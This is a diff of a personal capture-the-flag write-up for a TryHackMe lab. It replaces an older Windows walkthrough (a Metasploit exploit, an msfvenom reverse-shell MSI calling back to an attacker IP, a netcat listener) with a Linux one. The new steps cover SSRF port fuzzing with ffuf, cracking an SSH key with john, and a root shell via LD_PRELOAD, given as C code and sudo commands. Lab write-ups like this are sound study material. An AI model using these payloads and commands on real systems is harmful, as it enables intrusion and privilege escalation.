@@ -3,7 +3,7 @@ title: THM Creative
 author: hanhctf
 date: 2024-05-21 12:00:00 +0700
 categories: [Write-up, THM]
-tags: []
+tags: [SSRF]
 toc: true
 mermaid: true
 ---
@@ -12,10 +12,9 @@ mermaid: true
 
 # Summary
 >
-> - beta subdomain
-> - Use metasploit exploit user
-> - Use PrivescCheck.ps1, check Windows Privilege Escalation  
-> - AlwaysInstallElevated vuln
+> - 'beta' subdomain
+> - SSRF --> LFI 
+> - LPE with LD_Preload
 
 ## NMAP
 
@@ -37,56 +36,72 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web Enumeration
 
-The Nmap scan reveals only two ports: port 22, on which we have SSH, and port 80, a web server with nginx 1.18.0.
-
-Nothing interesting on the web server.
-
-Time to enumerate some subdomains `creative.thm`.
-
+The Nmap scan reveals only two ports: port 22, on which we have SSH, and port 80, a web server with nginx 1.18.0.  
+Nothing interesting on the web server.  
+Time to enumerate some subdomains `creative.thm`.  
 We find the subdomain `beta.creative.thm`.
 
-![](/commons/THM/Creative/0_subdomain.png)
+![](/commons/THM/Creative/0_subdomain.png)  
 
-Quick search, we found CVE-201801335 for Apache Tika 1.17 Server on [exploit-db](https://www.exploit-db.com/exploits/47208)
+Open `beta.creative.thm'  
 
-## Foothold
+![](/commons/THM/Creative/1_SSRF.png)
 
-Use Metasploit to exploit this vuln.
-![](/commons/THM/CyberLens/1_metasploit_exploit.png)
+This site will test a url. **Command inject**, **SSRF**, **LFI** is first things in my mind.  
 
-Worked.
+After try some simple payload. I found **SSRF**. Check port on `127.0.0.1`
+
+```shell
+ffuf -w /opt/SecLists/Fuzzing/5-digits-00000-99999.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3
+```
+![](/commons/THM/Creative/2_1337.png)
+
+After enumaration, we got id_rsa file.
+![](/commons/THM/Creative/3_id_rsa.png)
+
+Login SSH with this key. It request a passphare. :))  
+We will try to use ssh2john to crack passphare of ssh. (Almost in CTF, rockyou.txt is your friend)  
+
+```shell
+ssh2john id_rsa > id_rsa.hash
+/opt/john/run/john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ***GOT USER.TXT FLAG***
 
+
 ## Privilege Escalation
+Login as `saad`, we found creds in .bash_history.
+![](/commons/THM/Creative/5_creds.png)
 
-This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).
+Check `sudo -l`
+![](/commons/THM/Creative/6_ping.png)
 
-We can use curl to upload PrivescCheck.ps1 to victim via powershell.
-In this case. I run local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.
-In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`
+`/usr/bin/ping` can run as `root` but no command useful.  
+`env_keep+=LD_PRELOAD` we found an artic writes about [LPE using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) 
 
-Run tools:
+1.Create a `shell.c`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+```
+
+Compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type following:
 
 ```shell
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+ls -al shell.so
+sudo LD_PRELOAD=/tmp/shell.so sudo /usr/bin/ping
 ```
 
-We found a vuln that can be exploit.
+![](/commons/THM/Creative/7_root.png)
 
-![](/commons/THM/CyberLens/2_Always_Install_Elevated.png)
-
-And we can use [this exploit](https://juggernaut-sec.com/alwaysinstallelevated/)
-
-```text
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
-```
-
-And upload from local.
-In another terminal, listen on port 443 `sudo nc -nlvp 443`
-
-After get evil.msi in victim from local.
-Just run file. And we got system.
-![](/commons/THM/CyberLens/3_Root.png)
-
-***GOT ADMIN.TXT FLAG***
+***GOT ROOT.TXT FLAG***
